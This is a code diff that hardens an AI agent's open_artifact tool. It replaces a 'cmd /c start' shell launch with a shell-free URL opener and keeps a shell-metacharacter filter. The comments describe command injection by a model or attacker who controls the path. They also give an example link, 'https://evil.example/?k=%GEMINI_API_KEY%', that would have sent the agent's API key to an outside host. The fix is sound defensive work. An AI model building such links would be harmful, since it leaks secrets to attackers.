@@ -25,9 +25,11 @@ const { youtubeVideoId, OPEN_WEB_CODES } = require('../util/youtube-id');
 const ytEpisode = require('../util/youtube-episode'); // BUG-438
 const { ALL_ROUTES, SYNONYMS } = require('./routes');
 const { web_search } = require('./web-search');
+const { openUrlExternally } = require('./open-url');
 const { vaultRelativePath, vaultUrl, vaultAgeHours } = require('./vault-url');
 const { visionThink } = require('./vision-call');
 const evidence = require('./evidence');
+const { remedy } = evidence;
 // BUG-407: open_web(browser:true)'s hand-off, including the named-browser route.
 const externalRoute = require('./open-external-route');
 // C1: job_status is the pull-side counterpart of the announcer's push-side
@@ -620,14 +622,14 @@ function buildTools(ctx) {
         }
         rawPath = String(path).trim();
       }
-      // Reject shell metacharacters — this path becomes part of a shell command
-      // (cmd /c start on Windows, xdg-open on Linux). Without this, an LLM or
-      // attacker who controls the path can inject commands (&, |, ;, backticks,
-      // $() are all command separators/subshells). BUG-008: open_artifact is
-      // tiered T2 (leash/tiers.js) and auto-allows on every dispatch path, voice
-      // included — no confirm gate protects this call anywhere. This check (plus
-      // shell:false + explicit argv below) is the only line of defense, so it
-      // applies regardless of the caller.
+      // Reject shell metacharacters. BUG-008 added this when the path became
+      // part of a `cmd /c start` line; since B2c (2026-09-29) no shell runs it
+      // (open-url.js), so these characters can no longer inject a command. The
+      // filter is kept as it was — it now only narrows what a MODEL may type
+      // (a link it builds with "&" is refused; the signed vault link is built
+      // below, after this check). Loosening it is a separate change.
+      // open_artifact is tiered T2 (leash/tiers.js) and auto-allows on every
+      // dispatch path, voice included — no confirm gate protects this call.
       if (/[;&|`$()<>^]/.test(rawPath)) {
         return fail('Artifact path contains disallowed characters.');
       }
@@ -673,22 +675,20 @@ function buildTools(ctx) {
         } catch (err) {
           return fail(`Artifact exists but the dashboard server is not reachable at ${targetUrl} (${err.message}).`);
         }
+      } else if (!/^https?:\/\//i.test(rawPath)) {
+        // B2c (2026-09-29 audit): anything that is not a vault build is a web link
+        // or it goes to open_file, which has the file policy. It used to go to
+        // cmd /c start as it was — a file path there RAN whatever it named.
+        return { ok: false, result: `open_artifact opens builds in the vault (/vault/...) and web links; "${rawPath}" is neither. For a file on disk use open_file.`, remedy: remedy('open_file', { path: rawPath }, 'a file on disk opens through the file policy') };
       }
-      const platform = process.platform;
-      let cmd;
-      if (platform === 'win32') {
-        cmd = ['cmd', '/c', 'start', '', targetUrl];
-      } else if (platform === 'darwin') {
-        cmd = ['open', targetUrl];
-      } else {
-        cmd = ['xdg-open', targetUrl];
-      }
-      // spawn (async), NOT spawnSync — spawnSync blocks the entire event loop
-      // until the child exits, freezing the WS server and cortex tick. On Linux
-      // xdg-open can block for seconds. shell:false — we pass an explicit argv
-      // so no shell wrapping is needed; this is the injection-safe path.
-      const { spawn } = require('child_process');
-      const child = spawn(cmd[0], cmd.slice(1), { detached: true, stdio: 'ignore', shell: false });
+      // B2c: no cmd.exe (open-url.js). "cmd /c start" split this link at "&" — a
+      // signed vault link lost its &sig= and the browser got a 401 — and replaced
+      // %NAME% with MYTHOS's own environment variable, so a model-supplied
+      // "https://evil.example/?k=%GEMINI_API_KEY%" opened WITH THE KEY in it.
+      // Still async and detached: spawnSync would freeze the event loop.
+      const opened = openUrlExternally(targetUrl);
+      if (!opened.ok) return fail(`Could not open artifact: ${opened.reason}`);
+      const child = opened.child;
       // REMEDIATION P1-6: the spawn error was previously swallowed entirely
       // ("best-effort") — an opener that fails to even launch (missing OS
       // handler, bad path) still reported opened:true with no trace anywhere.
@@ -701,7 +701,6 @@ function buildTools(ctx) {
           ctx.bus.emit('health.anomaly', { kind: 'open-artifact-spawn-failed', error: err.message, path: rawPath });
         }
       });
-      child.unref();
       const display = title || rawPath;
       return ok({ opened: true, url: targetUrl, display, ageHours: vaultRelPath === null ? null : vaultAgeHours(vaultRelPath, fs) }); // BUG-319
     } catch (err) {
